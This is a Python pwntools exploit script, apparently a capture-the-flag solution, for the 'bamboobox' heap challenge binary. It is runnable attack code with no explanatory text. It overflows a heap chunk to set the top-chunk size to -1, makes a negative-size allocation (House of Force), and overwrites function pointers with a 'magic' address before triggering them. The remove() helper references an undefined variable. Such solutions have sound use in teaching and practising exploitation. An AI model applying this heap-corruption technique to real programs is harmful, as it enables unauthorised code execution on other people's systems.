#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./bamboobox",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")


def add(length,name):
    con.sendlineafter("choice:","2")
    con.sendlineafter("name:",str(length))
    con.sendlineafter("item:",name)
def modify(index,length,name):
    con.sendlineafter("choice:","3")
    con.sendlineafter("item:",str(index))
    con.sendlineafter("name:",str(length))
    con.sendafter("item:",name)
def remove():
    con.sendlineafter("choice:","4")
    con.sendlineafter("item:",str(index))

def show():
    con.sendlineafter("choice:","1")
def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    magic = 0x400d49
    add(0x60,"a"*4)
    modify(0,0x70,"\x00"*0x68+p64((-1)&0xffffffffffffffff))
    add((-160),"c"*4)
    add(0x10,p64(magic)*2)
    con.sendlineafter("choice:","5")
    
exploit()
con.interactive()
